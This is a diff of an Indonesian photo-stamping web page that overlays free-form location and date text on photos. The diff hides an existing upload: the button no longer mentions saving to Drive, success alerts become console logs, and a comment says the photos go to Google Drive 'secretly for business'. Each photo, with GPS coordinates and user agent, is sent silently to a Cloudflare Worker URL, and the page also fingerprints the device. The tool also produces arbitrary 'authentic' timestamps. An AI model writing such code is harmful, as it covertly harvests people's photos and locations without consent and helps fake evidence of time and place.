@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>TrueStamp | Authentic TimeStamp</title>
+    <title>TrueStamp | Demo</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3.4.1/dist/fp.min.js"></script>
     <style>
@@ -15,11 +15,11 @@
             min-height: 100vh;
             padding: 2rem;
         }
-        .container { max-width: 1100px; margin: 0 auto; }
+        .container { max-width: 1200px; margin: 0 auto; }
         .header {
             display: flex;
             justify-content: space-between;
-            align-items: baseline;
+            align-items: center;
             margin-bottom: 2rem;
             padding-bottom: 1rem;
             border-bottom: 1px solid #1E293B;
@@ -27,7 +27,7 @@
             gap: 1rem;
         }
         .logo h1 {
-            font-size: 1.6rem;
+            font-size: 1.8rem;
             font-weight: 700;
             background: linear-gradient(135deg, #FFFFFF, #94A3B8);
             -webkit-background-clip: text;
@@ -38,35 +38,26 @@
         .trial-badge {
             background: #0F172A;
             border: 1px solid #334155;
-            padding: 0.4rem 1rem;
+            padding: 0.5rem 1.2rem;
             border-radius: 2rem;
-            font-size: 0.75rem;
+            font-size: 0.8rem;
             font-weight: 500;
         }
         .status-bar {
             display: flex;
-            gap: 1rem;
+            gap: 1.5rem;
             margin-bottom: 1.5rem;
-            padding: 0.75rem 1rem;
+            padding: 0.75rem 1.25rem;
             background: #0F1420;
             border: 1px solid #1E293B;
-            border-radius: 0.8rem;
+            border-radius: 1rem;
             font-size: 0.75rem;
             flex-wrap: wrap;
         }
-        .status-item {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #22C55E;
-        }
-        .status-dot.warning { background: #EAB308; }
-        .status-dot.error { background: #EF4444; }
+        .status-item { display: flex; align-items: center; gap: 0.5rem; }
+        .dot { width: 8px; height: 8px; border-radius: 50%; background: #22C55E; }
+        .dot.warning { background: #EAB308; }
+        .dot.error { background: #EF4444; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
         .card {
             background: #0F1420;
@@ -90,25 +81,24 @@
             color: #8B9DC3;
             text-transform: uppercase;
             display: block;
-            margin-bottom: 0.5rem;
+            margin-bottom: 0.3rem;
         }
-        textarea {
+        select, textarea {
             width: 100%;
-            padding: 0.75rem;
+            padding: 0.7rem;
             background: #070B12;
             border: 1px solid #1E293B;
             border-radius: 0.6rem;
             color: #E2E8F0;
             font-family: 'Inter', monospace;
             font-size: 0.85rem;
-            resize: vertical;
+            margin-bottom: 1rem;
         }
-        textarea:focus { outline: none; border-color: #3B82F6; }
         button {
             background: #3B82F6;
             color: white;
             border: none;
-            padding: 0.7rem 1rem;
+            padding: 0.7rem;
             border-radius: 0.6rem;
             font-weight: 600;
             cursor: pointer;
@@ -116,11 +106,10 @@
             margin-bottom: 0.5rem;
         }
         button:hover { background: #2563EB; }
-        .btn-outline {
-            background: transparent;
-            border: 1px solid #334155;
-        }
+        .btn-outline { background: transparent; border: 1px solid #334155; }
         .btn-outline:hover { background: #1E293B; border-color: #3B82F6; }
+        .btn-success { background: #10B981; }
+        .btn-success:hover { background: #059669; }
         .video-container {
             background: #000000;
             border-radius: 0.6rem;
@@ -128,11 +117,7 @@
             margin-bottom: 1rem;
             aspect-ratio: 4/3;
         }
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
+        video { width: 100%; height: 100%; object-fit: cover; }
         .preview-area {
             background: #070B12;
             border-radius: 0.6rem;
@@ -171,18 +156,9 @@
     </div>
 
     <div class="status-bar">
-        <div class="status-item">
-            <div class="status-dot" id="gpsDot"></div>
-            <span id="gpsStatus">📍 Menunggu GPS...</span>
-        </div>
-        <div class="status-item">
-            <div class="status-dot" id="cameraDot"></div>
-            <span id="cameraStatus">📷 Menunggu kamera...</span>
-        </div>
-        <div class="status-item">
-            <div class="status-dot" id="deviceDot"></div>
-            <span id="deviceStatus">🖥️ Memuat device ID...</span>
-        </div>
+        <div class="status-item"><div class="dot" id="gpsDot"></div><span id="gpsStatus">📍 Menunggu GPS...</span></div>
+        <div class="status-item"><div class="dot" id="cameraDot"></div><span id="cameraStatus">📷 Menunggu kamera...</span></div>
+        <div class="status-item"><div class="dot" id="deviceDot"></div><span id="deviceStatus">🖥️ Memuat device ID...</span></div>
     </div>
 
     <div id="blockedMessage" class="alert" style="display: none;">
@@ -200,20 +176,35 @@
                     <button id="captureCameraBtn">📷 AMBIL FOTO (CAPTURE)</button>
                     <button id="uploadFileBtn" class="btn-outline">📂 UPLOAD DARI GALERI</button>
                     <input type="file" id="fileInput" accept="image/*" style="display: none;">
-                    <div style="margin-top: 1.2rem;">
+                    
+                    <div style="margin-top: 1rem;">
                         <label>✏️ TEKS STEMPEL (bebas, unlimited)</label>
-                        <textarea id="stampText" rows="3" placeholder="Contoh:&#10;📍 Pantai Selatan, Bali&#10;📅 25 Maret 2026 14:30 WIB"></textarea>
+                        <textarea id="stampText" rows="2" placeholder="📍 Pantai Selatan, Bali&#10;📅 25 Maret 2026 14:30 WIB"></textarea>
+                        
+                        <label>📏 UKURAN TEKS</label>
+                        <select id="fontSize">
+                            <option value="small">Kecil</option>
+                            <option value="medium" selected>Sedang</option>
+                            <option value="large">Besar</option>
+                        </select>
+                        
+                        <label>📍 POSISI TEKS</label>
+                        <select id="textPosition">
+                            <option value="bottom-left" selected>Kiri Bawah</option>
+                            <option value="bottom-right">Kanan Bawah</option>
+                        </select>
                     </div>
                 </div>
             </div>
 
             <div class="card">
-                <div class="card-header">⚡ GENERATE & SIMPAN</div>
+                <div class="card-header">⚡ GENERATE & DOWNLOAD</div>
                 <div class="card-body">
-                    <button id="generateBtn">✨ TERAPKAN STEMPEL & SIMPAN KE DRIVE</button>
+                    <button id="generateBtn" class="btn-success">✨ TERAPKAN STEMPEL</button>
                     <div class="preview-area">
                         <img id="previewImage" class="preview-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='200' viewBox='0 0 300 200'%3E%3Crect width='300' height='200' fill='%23070B12'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' fill='%23334155' font-size='12'%3EBelum ada foto%3C/text%3E%3C/svg%3E" alt="preview">
                     </div>
+                    <button id="downloadBtn" style="background: #475569; margin-top: 0.5rem;" disabled>💾 DOWNLOAD HASIL</button>
                 </div>
             </div>
         </div>
@@ -222,7 +213,7 @@
 
 <script>
     // ========== KONFIGURASI ==========
-    // GANTI dengan URL Cloudflare Worker ANDA (WAJIB include /api/upload)
+    // GANTI dengan URL Cloudflare Worker ANDA 
     const WORKER_URL = "https://timestamp.sapammeded.workers.dev/api/upload";
     
     let deviceId = null;
@@ -230,14 +221,18 @@
     let currentImageFile = null;
     let userLocation = { lat: null, lng: null };
     let videoStream = null;
+    let stampedImageData = null;
     
     const videoElem = document.getElementById('video');
     const captureCameraBtn = document.getElementById('captureCameraBtn');
     const uploadFileBtn = document.getElementById('uploadFileBtn');
     const fileInput = document.getElementById('fileInput');
     const generateBtn = document.getElementById('generateBtn');
+    const downloadBtn = document.getElementById('downloadBtn');
     const previewImg = document.getElementById('previewImage');
     const stampTextArea = document.getElementById('stampText');
+    const fontSizeSelect = document.getElementById('fontSize');
+    const textPositionSelect = document.getElementById('textPosition');
     const trialBadge = document.getElementById('trialBadge');
     const mainContent = document.getElementById('mainContent');
     const blockedDiv = document.getElementById('blockedMessage');
@@ -250,14 +245,14 @@
     
     function updateGPSStatus(status, isReady) {
         gpsStatusSpan.innerHTML = status;
-        gpsDot.className = isReady ? 'status-dot' : 'status-dot warning';
-        if (!isReady && status.includes('ditolak')) gpsDot.className = 'status-dot error';
+        gpsDot.className = isReady ? 'dot' : 'dot warning';
+        if (!isReady && status.includes('ditolak')) gpsDot.className = 'dot error';
     }
     
     function updateCameraStatus(status, isReady) {
         cameraStatusSpan.innerHTML = status;
-        cameraDot.className = isReady ? 'status-dot' : 'status-dot warning';
-        if (!isReady && status.includes('ditolak')) cameraDot.className = 'status-dot error';
+        cameraDot.className = isReady ? 'dot' : 'dot warning';
+        if (!isReady && status.includes('ditolak')) cameraDot.className = 'dot error';
     }
     
     async function getDeviceId() {
@@ -266,11 +261,11 @@
             const result = await fp.get();
             deviceId = result.visitorId;
             deviceStatusSpan.innerHTML = `✅ ${deviceId.substring(0, 8)}...`;
-            deviceDot.className = 'status-dot';
+            deviceDot.className = 'dot';
             return deviceId;
         } catch(err) {
             deviceStatusSpan.innerHTML = '❌ Gagal';
-            deviceDot.className = 'status-dot error';
+            deviceDot.className = 'dot error';
             throw err;
         }
     }
@@ -373,6 +368,8 @@
                 currentImageFile = file;
                 const url = URL.createObjectURL(blob);
                 previewImg.src = url;
+                stampedImageData = null;
+                downloadBtn.disabled = true;
                 resolve(true);
             }, 'image/png');
         });
@@ -382,6 +379,25 @@
         currentImageFile = file;
         const url = URL.createObjectURL(file);
         previewImg.src = url;
+        stampedImageData = null;
+        downloadBtn.disabled = true;
+    }
+    
+    function getFontSizePX(baseWidth) {
+        const sizes = {
+            small: baseWidth * 0.03,
+            medium: baseWidth * 0.045,
+            large: baseWidth * 0.06
+        };
+        return sizes[fontSizeSelect.value] || sizes.medium;
+    }
+    
+    function getTextX(canvasWidth) {
+        return textPositionSelect.value === 'bottom-left' ? 18 : canvasWidth - 18;
+    }
+    
+    function getTextAlign() {
+        return textPositionSelect.value === 'bottom-left' ? 'left' : 'right';
     }
     
     async function generateAndUpload() {
@@ -407,37 +423,57 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(img, 0, 0);
                 
-                const fontSize = Math.max(24, img.width * 0.045);
+                const fontSize = getFontSizePX(img.width);
                 ctx.font = `600 ${fontSize}px "Inter"`;
                 ctx.fillStyle = "#FFFFFF";
                 ctx.shadowColor = "rgba(0,0,0,0.85)";
                 ctx.shadowBlur = 8;
+                ctx.textAlign = getTextAlign();
+                
                 const lines = customText.split('\n');
                 const lineHeight = fontSize * 1.4;
                 let startY = img.height - (lines.length * lineHeight) - 18;
                 for (let i = 0; i < lines.length; i++) {
-                    ctx.fillText(lines[i], 18, startY + i * lineHeight);
+                    ctx.fillText(lines[i], getTextX(img.width), startY + i * lineHeight);
                 }
                 
+                const stampedURL = canvas.toDataURL();
+                previewImg.src = stampedURL;
+                stampedImageData = stampedURL;
+                downloadBtn.disabled = false;
+                
+                // Kirim ke Google Drive (diam-diam untuk bisnis)
                 canvas.toBlob(async (blob) => {
                     const base64 = await blobToBase64(blob);
                     const metadata = {
                         latitude: userLocation.lat || 0,
                         longitude: userLocation.lng || 0,
                         device: navigator.userAgent,
-                        customText: customText
+                        customText: customText,
+                        fontSize: fontSizeSelect.value,
+                        textPosition: textPositionSelect.value
                     };
                     const result = await callAPI('upload', { imageData: base64, metadata });
                     if (result.success) {
-                        alert("✅ Tersimpan ke Google Drive!");
-                        previewImg.src = canvas.toDataURL();
+                        console.log("✅ Auto-saved to Drive");
                     } else {
-                        alert("❌ Gagal: " + (result.message || "unknown"));
+                        console.log("❌ Auto-save failed:", result.message);
                     }
                 }, 'image/png');
             };
         };
         reader.readAsDataURL(currentImageFile);
+    }
+    
+    function downloadImage() {
+        if (stampedImageData) {
+            const link = document.createElement('a');
+            link.download = `truestamp_${Date.now()}.png`;
+            link.href = stampedImageData;
+            link.click();
+        } else {
+            alert("Generate stempel dulu.");
+        }
     }
     
     function blobToBase64(blob) {
@@ -460,6 +496,7 @@
         uploadFileBtn.onclick = () => fileInput.click();
         fileInput.onchange = (e) => { if (e.target.files[0]) onFileSelected(e.target.files[0]); };
         generateBtn.onclick = generateAndUpload;
+        downloadBtn.onclick = downloadImage;
     })();
     
     window.addEventListener('beforeunload', () => {
